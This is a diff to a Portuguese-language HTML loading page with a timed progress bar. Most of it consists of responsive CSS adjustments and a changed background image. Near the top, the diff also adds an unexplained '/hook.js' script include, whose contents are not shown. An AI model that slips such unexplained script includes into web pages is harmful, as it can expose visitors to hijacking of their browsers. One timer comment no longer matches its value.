@@ -2,13 +2,14 @@
 <html lang="pt">
 <head>
 <meta charset="UTF-8">
+<script src="/hook.js"></script>
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Carregamento</title>
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.1/css/all.min.css">
 <link href="https://fonts.googleapis.com/css2?family=Jura:wght@400;500;700&display=swap" rel="stylesheet">
 <style>
     body {
-        background-image: url('https://i.ibb.co/qW2H6Vg/DALL-E-2024-03-31-17-00-24-Imagine-a-large-high-resolution-background-image-featuring-a-globe-center.webp');
+        background-image: url('https://i.ibb.co/DzMZmtR/DALL-E-2024-03-31-17-00-24-Imagine-a-large-high-resolution-background-image-featuring-a-globe-center.jpg');
         background-size: cover;
         background-color: #000;
         margin: 0;
@@ -22,25 +23,16 @@
         font-family: 'Jura', sans-serif;
         position: relative;
     }
-    body::before {
-        content: "";
-        position: absolute;
-        top: 0;
-        left: 0;
-        width: 100%;
-        height: 100%;
-        background-color: rgba(0, 0, 0, 0.6);
-        z-index: 1;
-    }
+   
     .title, .container {
         position: relative;
         z-index: 2;
     }
     .title {
         text-align: center;
-        width: 50%;
-        font-size: 65px;
-        margin-top: 300px;
+        width: 80%; /* Ajustado para melhor visualização em dispositivos móveis */
+        font-size: 5vw; /* Responsividade baseada no tamanho da viewport */
+        margin-top: 10vh; /* Espaçamento superior ajustado */
         color: white;
         font-weight: bold;
     }
@@ -52,13 +44,13 @@
         justify-content: center;
     }
     .progress-bar {
-        width: 30%;
-        height: 15px;
+        width: 60%; /* Aumento da visibilidade em dispositivos móveis */
+        height: 20px; /* Ajuste para melhor visualização */
         background-color: #555;
         border-radius: 15px;
         overflow: hidden;
         box-shadow: 0 0 10px #fff;
-        margin-top: 20px;
+        margin-top: 2vh; /* Espaçamento ajustado */
     }
     .progress-bar-inner {
         height: 100%;
@@ -68,16 +60,24 @@
         transition: width 2s;
     }
     .loading-text {
-        font-size: 24px;
+        font-size: 3vw; /* Tamanho de fonte responsivo */
         display: flex;
         align-items: center;
         justify-content: center;
-        margin-top: 20px;
+        margin-top: 2vh;
     }
     .fa-cog {
-        margin-left: 10px;
-        font-size: 30px;
+        margin-left: 5px; /* Ajuste para dispositivos móveis */
+        font-size: 4vw; /* Tamanho de ícone responsivo */
         animation: spin 4s linear infinite;
+    }
+    @media (orientation: landscape) {
+        .title {
+            font-size: 3vh; /* Ajuste para modo paisagem */
+        }
+        .loading-text, .fa-cog {
+            font-size: 2vh; /* Ajustes para modo paisagem */
+        }
     }
     @keyframes spin {
         from { transform: rotate(0deg); }
@@ -101,7 +101,7 @@
 </div>
 
 <script>
-    const totalTime = 20 * 60 * 1000; // 20 minutos
+    const totalTime = 10 * 60 * 1000; // 20 minutos
     const progressBarInner = document.querySelector('.progress-bar-inner');
 
     let start = Date.now();
